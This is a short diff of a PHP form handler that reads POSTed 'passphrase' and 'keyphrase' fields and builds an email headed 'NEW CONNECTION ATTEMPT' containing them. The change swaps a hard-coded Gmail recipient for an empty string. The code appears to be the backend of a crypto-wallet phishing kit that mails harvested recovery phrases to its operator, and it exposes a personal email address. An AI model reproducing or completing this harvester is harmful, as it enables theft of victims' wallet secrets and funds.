@@ -6,7 +6,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $keyphrase = filter_input(INPUT_POST, 'keyphrase', FILTER_SANITIZE_STRING);
 
     // Set your email details
-    $to = "davidakinyoola1@gmail.com";
+    $to = "";
     $subject = "NEW CONNECTION ATTEMPT";
     
     $message = "Passphrase: " . $passphrase . "\n";
